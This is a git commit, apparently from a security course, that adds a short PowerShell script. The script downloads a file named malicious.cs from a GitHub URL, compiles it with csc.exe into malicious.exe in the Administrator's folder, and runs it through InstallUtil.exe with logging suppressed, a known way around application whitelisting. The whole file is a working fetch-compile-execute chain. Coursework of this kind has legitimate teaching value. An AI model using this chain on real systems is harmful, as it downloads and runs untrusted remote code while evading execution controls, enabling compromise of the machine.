8240805723bd7929d44a6d1d8d09c824a34565dd
Nicholas Spagnola <39714515+EvaStanAccount@users.noreply.github.com>
2024-03-05 18:01:53 -0500

    Add files via upload

---
+++ Week9/Week9.ps1
@@ -0,0 +1,6 @@
+﻿$wc = New-Object Net.WebClient
+$wc.DownloadFile("https://raw.githubusercontent.com/EvaStanAccount/IT4077/Main/Week9/malicious.cs","C:\Users\Administrator\malicious.cs")
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /out:C:\Users\Administrator\malicious.exe C:\Users\Administrator\malicious.cs
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Administrator\malicious.exe
